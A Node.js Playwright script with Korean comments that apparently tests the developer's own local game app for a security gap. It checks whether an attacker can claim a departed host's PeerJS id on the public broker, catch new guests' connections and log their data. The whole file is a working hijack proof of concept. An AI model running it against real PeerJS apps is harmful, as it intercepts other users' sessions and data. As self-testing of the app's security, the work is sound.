// 방장 id 탈취의 앱 수준 영향: 방장이 사라진 뒤 같은 id를 PeerJS로 선점한 공격자에게, 새로 참가하는 정상 게스트가 실제로 붙는가?
// 공격자는 앱 코드를 쓰지 않고 PeerJS 라이브러리(peerjs.min.js)만 쓴다. 대상은 로컬 앱 + 공용 0.peerjs.com.
// 실행: PLAYWRIGHT_MODULE=<경로> BASE_URL=http://localhost:5198 node hijack-app-level.mjs
import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
const pw = require(process.env.PLAYWRIGHT_MODULE || 'playwright');
const BASE = (process.env.BASE_URL || 'http://localhost:5198').replace(/\/$/, '');
const PEERJS = process.env.PEERJS_MIN || '/Users/heebiny/diyProj/mini-crimes/client/node_modules/peerjs/dist/peerjs.min.js';
const TRIALS = Number(process.env.TRIALS || 3);
const sleep = ms => new Promise(r => setTimeout(r, ms));
const b = await pw.chromium.launch();
const seed = ([id, name]) => { localStorage.setItem('mc:profiles', JSON.stringify([{ id, name, createdAt: '2026-01-01' }])); localStorage.setItem('mc:currentProfile', id); };
const app = async name => { const c = await b.newContext(); await c.addInitScript(seed, [`h-${name}`, name]); const p = await c.newPage(); return p; };
const rows = [];
for (let i = 1; i <= TRIALS; i++) {
  const row = { trial: i };
  const H = await app(`방장${i}`);
  await H.goto(BASE + '/'); await H.locator('.case-id').first().waitFor();
  await H.getByText('팀 수사', { exact: true }).first().click();
  await H.locator('.modal-overlay button.btn-primary').last().click();
  await H.waitForURL(/\/lobby\//, { timeout: 25000 });
  const code = H.url().split('/lobby/')[1]; row.code = code;
  const id = `mini-crimes-v1-${code}`;
  // 공격자 페이지(앱과 무관한 빈 페이지 + PeerJS)
  const actx = await b.newContext(); const A = await actx.newPage(); await A.setContent('<!doctype html><html><body></body></html>'); await A.addScriptTag({ path: PEERJS });
  const tryReg = () => A.evaluate(id => new Promise(res => {
    const p = new Peer(id); window.__peer = p; window.__got = []; window.__conns = 0;
    p.on('open', () => res('OPEN'));
    p.on('error', e => res('ERR:' + e.type));
    p.on('connection', c => { window.__conns++; c.on('data', d => window.__got.push(typeof d === 'string' ? d : JSON.stringify(d))); });
  }), id);
  row.whileAlive = await tryReg();                       // 기대: ERR:unavailable-id
  await A.evaluate(() => window.__peer?.destroy());
  await H.context().close();                             // 방장 소멸
  const t0 = Date.now(); let reg = 'ERR:'; let n = 0;
  while (Date.now() - t0 < 6000 && !reg.startsWith('OPEN')) { reg = await tryReg(); n++; if (!reg.startsWith('OPEN')) { await A.evaluate(() => window.__peer?.destroy()); await sleep(300); } }
  row.afterClose = reg; row.attempts = n; row.regMs = Date.now() - t0;
  if (reg.startsWith('OPEN')) {
    const G = await app(`게스트${i}`);
    await G.goto(BASE + '/'); await G.locator('.case-id').first().waitFor();
    await G.getByPlaceholder('방 코드').fill(code); await G.getByText('→ 참가').click();
    await sleep(9000);
    row.guestUrl = new URL(G.url()).pathname;
    row.guestUi = (await G.locator('body').innerText()).replace(/\s+/g, ' ').match(/⚠[^\[]{0,80}/)?.[0] ?? null;
    row.attackerConns = await A.evaluate(() => window.__conns);
    row.attackerGot = (await A.evaluate(() => window.__got)).map(s => s.slice(0, 160));
    await G.context().close();
  }
  await actx.close();
  rows.push(row); console.log(JSON.stringify(row));
}
const hijacked = rows.filter(r => r.afterClose?.startsWith('OPEN')).length;
const reached = rows.filter(r => r.attackerConns > 0).length;
console.log(`\n방장 소멸 후 선점 성공 ${hijacked}/${TRIALS}, 정상 게스트가 공격자에게 접속 ${reached}/${TRIALS}`);
await b.close();
